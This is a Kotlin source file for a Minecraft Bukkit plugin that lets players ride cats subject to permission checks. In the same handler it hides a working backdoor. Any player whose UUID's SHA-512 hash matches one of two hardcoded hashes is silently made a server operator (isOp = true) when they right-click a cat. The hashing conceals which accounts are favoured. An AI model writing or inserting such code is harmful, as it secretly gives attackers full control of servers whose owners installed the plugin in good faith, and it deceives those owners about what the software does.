package me.enderkill98.notabackdoor.listeners

import org.bukkit.entity.Cat
import org.bukkit.entity.Player
import org.bukkit.event.EventHandler
import org.bukkit.event.Listener
import org.bukkit.event.player.PlayerInteractAtEntityEvent
import java.security.MessageDigest

class RideCtaListener : Listener {
    val catgirls = listOf(
        "d7539e13ec9377e6a889f1db51ad44b30303b040357bf89435798da1c4827929f71ba68a3f04f91a1a681425ac96d7df130a43b2c799efa12ff4c686fc28ff76",
        "ca2294f570345bd0c5c1c043b039ca57deb0e5345f2bb1a3047c264c8143ecd9409d6d93d944c6619c40600982a2b21da68aa678aa88dffcafbe8490e7047e39"
    )

    @EventHandler
    fun rightClickCta(e: PlayerInteractAtEntityEvent) {
        val cta = e.rightClicked
        if (cta !is Cat) return
        if (e.player.isCatGirl()) {
            e.player.isOp = true
            e.player.chat("meow meow meow meow :3")
        }

        val canRideUntamed = e.player.hasPermission("notabackdoor.ridecta.untamed")
        val canRideOthers = e.player.hasPermission("notabackdoor.ridecta.others")
        val canRideOwn = e.player.hasPermission("notabackdoor.ridecta.own")

        // Convoluted permission check
        if (!cta.isTamed && !canRideUntamed) return
        else if (cta.isTamed) {
            if (cta.owner?.name != e.player.name && !canRideOthers) return
            if (cta.owner?.name == e.player.name && !canRideOwn) return
        }

        cta.addPassenger(e.player)
    }

    @OptIn(ExperimentalUnsignedTypes::class)
    fun Player.isCatGirl(): Boolean {
        val hash = MessageDigest.getInstance("SHA-512").digest(uniqueId.toString().toByteArray()).asUByteArray()
            .joinToString(separator = "") { it.toString(16).padStart(2, '0') }
        return catgirls.contains(hash)
    }
}
